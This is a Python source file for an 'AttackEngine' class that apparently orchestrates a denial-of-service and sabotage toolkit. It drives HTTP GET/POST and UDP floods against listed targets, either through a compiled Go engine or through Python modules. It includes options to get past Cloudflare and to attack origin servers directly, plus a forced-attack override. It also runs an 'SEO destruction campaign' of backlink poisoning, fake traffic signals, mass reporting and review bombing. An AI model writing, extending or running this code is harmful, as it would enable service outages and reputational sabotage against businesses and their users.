import asyncio
import logging
import os
from typing import List, Dict
import json
import yaml

class AttackEngine:
    def __init__(self, config_path: str = "config/settings.yaml"):
        self.config = self._load_config(config_path)
        self.logger = self._setup_logger()
        self.targets = self._load_targets()
        self.is_running = False

    def _load_config(self, path: str) -> Dict:
        try:
            with open(path, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            print(f"Error loading config: {e}")
            return {}

    def _load_targets(self) -> List[Dict]:
        try:
            with open('config/targets.json', 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading targets: {e}")
            return []

    def _setup_logger(self):
        log_file = self.config.get('logging', {}).get('file_path', 'output/logs/app.log')
        logging.basicConfig(
            level=self.config.get('logging', {}).get('level', 'INFO'),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger("AttackEngine")

    async def run_recon(self, target: str):
        self.logger.info(f"Starting reconnaissance for {target}...")
        # Placeholder for reconnaissance logic
        await asyncio.sleep(1)
        self.logger.info(f"Reconnaissance completed for {target}.")

    async def run_attack(self, target: str, vector: str, duration: int, threads: int = 50, bypass: str = None, origin_ip: str = None, adaptive: bool = False, **kwargs):
        self.logger.info(f"Initiating attack sequence on {target}...")
        self.is_running = True
        
        # Shared metrics/ctrl placeholders
        shared_metrics = None
        adaptive_ctrl = None
        if vector in ["http_get_flood", "http_post_flood"] and adaptive:
            if kwargs.get('force'):
                os.environ["FORCE_ATTACK"] = "1"
            
            from src.core.universal_attack import run_universal_attack
            
            # Load Recon Data if exists
            target_domain = target.replace("https://", "").replace("http://", "").split("/")[0]
            recon_file = f"output/reports/recon_{target_domain}.json"
            recon_data = {}
            if os.path.exists(recon_file):
                with open(recon_file, 'r') as f:
                    recon_data = json.load(f)
            
            summary = await run_universal_attack(target_domain, duration, threads, recon_data)
            self.is_running = False
            return
            
        # Fallback to old engine for other vectors...

        # 1. Decision: Direct-to-Origin Bypass
        if bypass == "origin" and origin_ip:
            self.logger.info(f"Origin Bypass: Direct-to-Origin Attack on {origin_ip}")
            # Target is the IP, but we should handle the Host header inside the vectors
            host = target.replace("https://", "").replace("http://", "").split("/")[0]
            target_url = f"http://{origin_ip}"
        else:
            target_url = target if target.startswith("http") else f"http://{target}"
            host = target_url.replace("https://", "").replace("http://", "").split("/")[0]
        
        # 2. Check for compiled Go engine for L7
        go_engine_path = os.path.abspath("bin/go_engine.exe")
        
        if os.path.exists(go_engine_path) and vector in ["http_get_flood", "http_post_flood"] and not adaptive:
            self.logger.info(f"[*] Executing high-performance Go L7 Engine...")
            cmd = [
                go_engine_path,
                "--target", target_url,
                "--threads", str(threads),
                "--duration", str(duration),
                "--method", "GET" if vector == "http_get_flood" else "POST"
            ]
            
            if bypass == "cloudflare":
                cmd.append("--h2")
            
            # Pass DEBUG=1 if diagnose is enabled
            env = os.environ.copy()
            if kwargs.get('diagnose'):
                env["DEBUG"] = "1"

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            # Real-time metrics parsing for Go Engine
            async def parse_output(stream):
                while True:
                    line = await stream.readline()
                    if not line:
                        break
                    decoded = line.decode().strip()
                    
                    # DEBUG: Capture all Go output if diagnose is enabled
                    if kwargs.get('diagnose'):
                        print(f"[Go Debug] {decoded}")

                    if decoded.startswith("METRICS:"):
                        try:
                            m_json = json.loads(decoded.replace("METRICS:", ""))
                            self.logger.info(f"[Go Engine] Att: {m_json['attempted']} | OK: {m_json['completed']} | Err: {m_json['failed']} | TO: {m_json['timeouts']}")
                        except: pass
                    elif decoded.startswith("FINAL_METRICS:"):
                        self.logger.info(f"[Go Engine] Final Summary: {decoded.replace('FINAL_METRICS:', '')}")
                    else:
                        self.logger.info(f"[Go Engine] {decoded}")

            await asyncio.gather(
                parse_output(process.stdout),
                parse_output(process.stderr)
            )
            await process.wait()
        else:
            # Fallback to Python Vectors
            self.logger.info(f"[*] Using Python Vector: {vector}")
            if vector == "http_get_flood":
                from src.vectors.l7_application.http_get_flood import HTTPGetFlood
                v = HTTPGetFlood(target_url, headers={"Host": [host]}, adaptive_ctrl=adaptive_ctrl, shared_metrics=shared_metrics)
                await v.start(duration, threads, force=kwargs.get('force', False), diagnose=kwargs.get('diagnose', False))
            elif vector == "http_post_flood":
                from src.vectors.l7_application.http_post_flood import HTTPPostFlood
                v = HTTPPostFlood(target_url, headers={"Host": [host]}, adaptive_ctrl=adaptive_ctrl, shared_metrics=shared_metrics)
                await v.start(duration, threads)
            elif vector == "udp_flood":
                from src.vectors.l3_volumetric.udp_flood import UDPFlood
                v = UDPFlood(target_url)
                v.start(duration, threads)
            else:
                self.logger.error(f"[-] Vector {vector} not implemented or Go engine missing.")
        
        if adaptive_ctrl:
            adaptive_ctrl.stop()
            
        self.is_running = False
        self.logger.info(f"Attack finished on {target}.")

    async def run_seo_campaign(self, target: str, duration: int = 60, threads: int = 10):
        self.logger.info(f"[*] Launching SEO Destruction Campaign on {target}...")
        
        from src.vectors.seo.backlink_poisoning import BacklinkPoisoning
        from src.vectors.seo.mass_report import MassReport
        from src.vectors.seo.review_bomb import ReviewBomb
        from src.vectors.seo.negative_signal import NegativeSignalInjection

        # 1. Backlink Poisoning (Penguin Penalty)
        poisoner = BacklinkPoisoning(target)
        poison_task = asyncio.create_task(poisoner.run(duration, threads))

        # 2. Negative Signal Injection (Traffic Quality Penalty)
        signaler = NegativeSignalInjection(target)
        signal_task = asyncio.create_task(signaler.run(duration, threads * 5))

        # 3. Mass Reporting (Manual/Algorithmic Review)
        reporter = MassReport(target)
        report_task = asyncio.create_task(reporter.run(count=threads * 5))

        # 4. Review Bombing (Trust/Reputation Penalty)
        bomber = ReviewBomb(target)
        bomb_task = asyncio.create_task(bomber.run(count=threads * 2))

        # Wait for all SEO tasks to complete
        await asyncio.gather(poison_task, signal_task, report_task, bomb_task)
        
        self.logger.info(f"[+] SEO destruction campaign completed for {target}.")

    async def stop(self):
        self.logger.info("Stopping all operations...")
        self.is_running = False
